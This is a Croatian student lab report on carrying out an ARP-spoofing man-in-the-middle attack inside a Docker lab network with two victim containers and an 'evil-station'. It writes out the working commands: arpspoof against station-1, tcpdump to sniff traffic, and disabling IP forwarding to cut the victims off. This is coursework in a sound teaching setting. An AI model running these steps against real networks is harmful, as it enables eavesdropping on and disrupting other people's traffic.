# Izvještaj laboratorijskih vježbi

# 1. Laboratorijska vježba

12.10.2021.

---

## Zadatak

Realizirati man in the middle napad iskorištavanjem ranjivosti ARP protokola. 

Student će testirati napad u virtualiziranoj Docker mreži (Docker container networking) koju čine 3 virtualizirana Docker računala (eng. container): 

1. dvije žrtve : station-1 i station-2
2. napadač : evil-station

## Alati koje smo koristili

**Kloniranje repozitorija**

$ git clone https://github.com/mcagalj/SRP-2021-22

**Promjena direktorija**

$ cd SRP-2021-22/arp-spoofing

**Pokretanje i zaustavljanje docker containera**

$ ./start.sh

$ ./stop.sh

**Lista pokrenutih containera**

$ docker ps

CONTAINER ID   IMAGE      COMMAND        CREATED                 STATUS         PORTS     NAMES
34ff54125af7      srp/arp     "bash"                 5 minutes ago        Up 5 minutes             station-1
eb2dd37950b9   srp/arp     "bash"                 5 minutes ago        Up 5 minutes             station-2
6a921b6dc643    srp/arp     "bash"                 5 minutes ago        Up 5 minutes             evil-station

**Pokretanje interaktivnog shella u *station-1* containeru**

$ docker exec -it station-1 bash

**Provjera nalazi li se *station-2* na istoj mreži** 

$ ping station-2

PING station-2 (172.24.0.4) 56(84) bytes of data.
64 bytes from station-2.srp-lab  (172.18.0.4): icmp_seq=1 ttl=64 time=0.172 ms
64 bytes from station-2.srp-lab  (172.18.0.4): icmp_seq=2 ttl=64 time=0.173 ms
64 bytes from station-2.srp-lab  (172.18.0.4): icmp_seq=3 ttl=64 time=0.176 ms
64 bytes from station-2.srp-lab  (172.18.0.4): icmp_seq=4 ttl=64 time=0.166 ms
64 bytes from station-2.srp-lab  (172.18.0.4): icmp_seq=5 ttl=64 time=0.170 ms

**Pokretanje interaktivnog shella u *station-2* containeru**

$ docker exec -it station-2 bash

**Na containeru *station-1* pomoću netcata otvaramo server socket na portu 9000**

$ netcat -lp 9000

**Na containeru *station-2* pomoću netcata otvaramo server socket na hostname *station-1* 9000**

$ netcat station-1 9000

**Pokretanje interaktivnog shella u *evil-station* container**

$ docker exec -it evil-station bash

## Napad

**U containeru *evil-station* pokrećemo arpspoof**

$ arpspoof -t station-1 station-2

**Pokrećemo tcpdump u containeru *evil-station* i pratimo promet**

$ tcpdump

**Gasimo prosljeđivanje paketa sa containera *evil-station***

$ echo 0 > /proc/sys/net/ipv4/ip_forward